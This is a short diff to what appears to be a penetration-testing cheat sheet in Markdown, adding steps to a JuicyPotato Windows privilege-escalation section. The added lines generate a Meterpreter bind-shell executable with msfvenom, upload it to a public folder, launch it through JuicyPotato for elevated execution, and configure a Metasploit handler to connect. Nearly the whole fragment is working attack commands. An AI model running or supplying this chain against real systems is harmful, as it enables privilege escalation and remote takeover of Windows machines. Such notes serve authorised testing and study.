@@ -584,6 +584,14 @@ mkdir /temp
 cd /temp
 upload JuicyPotato.exe 
 execute -f JuicyPotato.exe -a '-t u -p "C:\Windows\System32\cmd.exe" -l 4444' -i
+
+msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=10.10.1.2 LPORT=6666 -f exe -o bind_tcp.exe
+upload bind_tcp.exe C:\\users\\public\\
+execute -f JuicyPotato.exe -a '-t u -p "C:\users\public\bind_tcp.exe" -l 4444' -i
+use multi/handler
+set payload windows/x64/meterpreter/bind_tcp
+set LPORT 6666
+set RHOST <IP>
 ```
 
 ### Rogue potato
